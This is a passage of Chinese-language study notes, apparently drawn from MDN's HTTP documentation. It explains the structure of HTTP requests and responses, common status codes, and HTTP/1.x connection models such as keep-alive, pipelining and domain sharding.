注意最后的空行，它把首部与数据块分隔开。由于在 HTTP 首部中没有 `Content-Length`，数据块是空的，所以服务器可以在收到代表首部结束的空行后就开始处理请求。

例如，发送表单的结果：

```
POST /contact_form.php HTTP/1.1
Host: developer.mozilla.org
Content-Length: 64
Content-Type: application/x-www-form-urlencoded

name=Joe%20User&request=Send%20me%20one%20of%20your%20catalogue
```

#### 请求方法

HTTP 定义了一组 [请求方法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods) 用来指定对目标资源的行为。它们一般是名词，但这些请求方法有时会被叫做 HTTP 动词。最常用的请求方法是 `GET` 和 `POST`：

- [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法请求指定的资源。`GET` 请求应该只被用于获取数据。
- [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 方法向服务器发送数据，因此会改变服务器状态。这个方法常在 [HTML 表单](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Forms) 中使用。

### 8.3 服务器响应结构

当收到用户代理发送的请求后，Web 服务器就会处理它，并最终送回一个响应。与客户端请求很类似，服务器响应由一系列文本指令组成, 并使用 CRLF 分隔，它们被划分为三个不同的块：

1. 第一行是 *`状态行`，*包括使用的 HTTP 协议版本，状态码和一个状态描述（可读描述文本）。
2. 接下来每一行都表示一个 HTTP 首部，为客户端提供关于所发送数据的一些信息（如类型，数据大小，使用的压缩算法，缓存指示）。与客户端请求的头部块类似，这些 HTTP 首部组成一个块，并以一个空行结束。
3. 最后一块是数据块，包含了响应的数据 （如果有的话）。

#### 响应示例

成功的网页响应：

```
HTTP/1.1 200 OK
Date: Sat, 09 Oct 2010 14:28:02 GMT
Server: Apache
Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
ETag: "51142bc1-7449-479b075b2891b"
Accept-Ranges: bytes
Content-Length: 29769
Content-Type: text/html

<!DOCTYPE html... (这里是 29769 字节的网页HTML源代码)
```

请求资源已被永久移动的网页响应：

```
HTTP/1.1 301 Moved Permanently
Server: Apache/2.2.3 (Red Hat)
Content-Type: text/html; charset=iso-8859-1
Date: Sat, 09 Oct 2010 14:30:24 GMT
Location: https://developer.mozilla.org/ (目标资源的新地址, 服务器期望用户代理去访问它)
Keep-Alive: timeout=15, max=98
Accept-Ranges: bytes
Via: Moz-Cache-zlb05
Connection: Keep-Alive
X-Cache-Info: caching
X-Cache-Info: caching
Content-Length: 325 (如果用户代理无法转到新地址，就显示一个默认页面)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="https://developer.mozilla.org/">here</a>.</p>
<hr>
<address>Apache/2.2.3 (Red Hat) Server at developer.mozilla.org Port 80</address>
</body></html>
```

请求资源不存在的网页响应：

```
HTTP/1.1 404 Not Found
Date: Sat, 09 Oct 2010 14:33:02 GMT
Server: Apache
Last-Modified: Tue, 01 May 2007 14:24:39 GMT
ETag: "499fd34e-29ec-42f695ca96761;48fe7523cfcc1"
Accept-Ranges: bytes
Content-Length: 10732
Content-Type: text/html

<!DOCTYPE html... (包含一个站点自定义404页面, 帮助用户找到丢失的资源)
```

#### 响应状态码

[HTTP 响应状态码](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) 用来表示一个 HTTP 请求是否成功完成。响应被分为 5 种类型：信息型响应，成功响应，重定向，客户端错误和服务端错误。

- [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200): OK. 请求成功。
- [`301`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/301): Moved Permanently. 请求资源的 URI 已被改变。
- [`404`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404): Not Found. 服务器无法找到请求的资源。

----

## 9. HTTP/1.x的连接管理

连接管理是一个 HTTP 的关键话题：打开和保持连接在很大程度上影响着网站和 Web 应用程序的性能。在 HTTP/1.x 里有多种模型：*短连接*, *长连接*, 和 *HTTP 流水线。*

HTTP 的传输协议主要依赖于 TCP 来提供从客户端到服务器端之间的连接。在早期，HTTP 使用一个简单的模型来处理这样的连接。这些连接的生命周期是短暂的：每发起一个请求时都会创建一个新的连接，并在收到应答时立即关闭。

这个简单的模型对性能有先天的限制：打开每一个 TCP 连接都是相当耗费资源的操作。客户端和服务器端之间需要交换好些个消息。当请求发起时，网络延迟和带宽都会对性能造成影响。现代浏览器往往要发起很多次请求(十几个或者更多)才能拿到所需的完整信息，证明了这个早期模型的效率低下。

有两个新的模型在 HTTP/1.1 诞生了。首先是长连接模型，它会保持连接去完成多次连续的请求，减少了不断重新打开连接的时间。然后是 HTTP 流水线模型，它还要更先进一些，多个连续的请求甚至都不用等待立即返回就可以被发送，这样就减少了耗费在网络延迟上的时间。

![Compares the performance of the three HTTP/1.x connection models: short-lived connections, persistent connections, and HTTP pipelining.](https://mdn.mozillademos.org/files/13727/HTTP1_x_Connections.png)

HTTP/2 新增了其它连接管理模型。

要注意的一个重点是 HTTP 的连接管理适用于两个连续节点之间的连接，如 [hop-by-hop](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#hbh)，而不是 [end-to-end](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#e2e)。当模型用于从客户端到第一个代理服务器的连接和从代理服务器到目标服务器之间的连接时(或者任意中间代理)效果可能是不一样的。HTTP 协议头受不同连接模型的影响，比如 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 和 [`Keep-Alive`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Keep-Alive)，就是 [hop-by-hop](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#hbh) 协议头，它们的值是可以被中间节点修改的。

一个相关的话题是HTTP连接升级，在这里，一个HTTP/1.1 连接升级为一个不同的协议，比如TLS/1.0，Websocket，甚至明文形式的HTTP/2。更多细节参阅[协议升级机制](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism)。

### 9.1 短连接

HTTP 最早期的模型，也是  HTTP/1.0 的默认模型，是短连接。每一个 HTTP 请求都由它自己独立的连接完成；这意味着发起每一个 HTTP 请求之前都会有一次 TCP 握手，而且是连续不断的。

TCP 协议握手本身就是耗费时间的，所以 TCP 可以保持更多的热连接来适应负载。短连接破坏了 TCP 具备的能力，新的冷连接降低了其性能。

这是 HTTP/1.0 的默认模型(如果没有指定 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 协议头，或者是值被设置为 `close`)。而在 HTTP/1.1 中，只有当 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 被设置为 `close` 时才会用到这个模型。

除非是要兼容一个非常古老的，不支持长连接的系统，没有一个令人信服的理由继续使用这个模型。

### 9.2 长连接

短连接有两个比较大的问题：创建新连接耗费的时间尤为明显，另外 TCP 连接的性能只有在该连接被使用一段时间后(热连接)才能得到改善。为了缓解这些问题，*长连接* 的概念便被设计出来了，甚至在 HTTP/1.1 之前。或者这被称之为一个 *keep-alive* 连接。

一个长连接会保持一段时间，重复用于发送一系列请求，节省了新建 TCP 连接握手的时间，还可以利用 TCP 的性能增强能力。当然这个连接也不会一直保留着：连接在空闲一段时间后会被关闭(服务器可以使用 [`Keep-Alive`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Keep-Alive) 协议头来指定一个最小的连接保持时间)。

长连接也还是有缺点的；就算是在空闲状态，它还是会消耗服务器资源，而且在重负载时，还有可能遭受 [DoS attacks](https://developer.mozilla.org/en-US/docs/Glossary/DoS_attack) 攻击。这种场景下，可以使用非长连接，即尽快关闭那些空闲的连接，也能对性能有所提升。

HTTP/1.0 里默认并不使用长连接。把 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 设置成 `close` 以外的其它参数都可以让其保持长连接，通常会设置为 `retry-after。`

在 HTTP/1.1 里，默认就是长连接的，协议头都不用再去声明它(但我们还是会把它加上，万一某个时候因为某种原因要退回到 HTTP/1.0 呢)。

### 9.3 HTTP流水线

HTTP 流水线在现代浏览器中并不是默认被启用的：

- Web 开发者并不能轻易的遇见和判断那些搞怪的[代理服务器](https://en.wikipedia.org/wiki/Proxy_server)的各种莫名其妙的行为。
- 正确的实现流水线是复杂的：传输中的资源大小，多少有效的 [RTT](https://en.wikipedia.org/wiki/Round-trip_delay_time) 会被用到，还有有效带宽，流水线带来的改善有多大的影响范围。不知道这些的话，重要的消息可能被延迟到不重要的消息后面。这个重要性的概念甚至会演变为影响到页面布局！因此 HTTP 流水线在大多数情况下带来的改善并不明显。
- 流水线受制于 [HOL](https://en.wikipedia.org/wiki/Head-of-line_blocking) 问题。

由于这些原因，流水线已经被更好的算法给代替，如 *multiplexing*，已经用在 HTTP/2。

默认情况下，[HTTP](https://developer.mozilla.org/en/HTTP) 请求是按顺序发出的。下一个请求只有在当前请求收到应答过后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。

流水线是在同一条长连接上发出连续的请求，而不用等待应答返回。这样可以避免连接延迟。理论上讲，性能还会因为两个 HTTP 请求有可能被打包到一个 TCP 消息包中而得到提升。就算 HTTP 请求不断的继续，尺寸会增加，但设置 TCP 的 [MSS](https://en.wikipedia.org/wiki/Maximum_segment_size)(Maximum Segment Size) 选项，仍然足够包含一系列简单的请求。

并不是所有类型的 HTTP 请求都能用到流水线：只有 [idempotent](https://developer.mozilla.org/en-US/docs/Glossary/idempotent) 方式，比如 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)、[`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)、[`PUT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT) 和 [`DELETE`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/DELETE) 能够被安全的重试：如果有故障发生时，流水线的内容要能被轻易的重试。

今天，所有遵循 HTTP/1.1 的代理和服务器都应该支持流水线，虽然实际情况中还是有很多限制：一个很重要的原因是，目前没有现代浏览器默认启用这个特性。

### 9.4 域名分片

除非你有紧急而迫切的需求，不要使用这一过时的技术，升级到 HTTP/2 就好了。在 HTTP/2 里，做域名分片就没必要了：HTTP/2 的连接可以很好的处理并发的无优先级的请求。域名分片甚至会影响性能。大多数 HTTP/2 的实现还会使用一种称作[连接凝聚](https://daniel.haxx.se/blog/2016/08/18/http2-connection-coalescing/)的技术去尝试合并被分片的域名。

作为 HTTP/1.x 的连接，请求是序列化的，哪怕本来是无序的，在没有足够庞大可用的带宽时，也无从优化。一个解决方案是，浏览器为每个域名建立多个连接，以实现并发请求。曾经默认的连接数量为 2 到 3 个，现在比较常用的并发连接数已经增加到 6 条。如果尝试大于这个数字，就有触发服务器 DoS 保护的风险。

如果服务器端想要更快速的响应网站或应用程序的应答，它可以迫使客户端建立更多的连接。例如，不要在同一个域名下获取所有资源，假设有个域名是 `www.example.com`，我们可以把它拆分成好几个域名：`www1.example.com`、`www2.example.com`、`www3.example.com`。所有这些域名都指向同一台服务器，浏览器会同时为每个域名建立 6 条连接(在我们这个例子中，连接数会达到 18 条)。这一技术被称作域名分片。

![img](https://mdn.mozillademos.org/files/13783/HTTPSharding.png)

### 9.5 结论

改进后的连接管理极大的提升了 HTTP 的性能。不管是 HTTP/1.1 还是 HTTP/1.0，使用长连接 – 直到进入空闲状态 – 都能达到最佳的性能。然而，解决流水线故障需要设计更先进的连接管理模型，HTTP/2 已经在尝试了。

----





# 参考链接

[Mozilla Web开发技术 HTTP文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP)

[Web 安全](https://infosec.mozilla.org/guidelines/web_security)

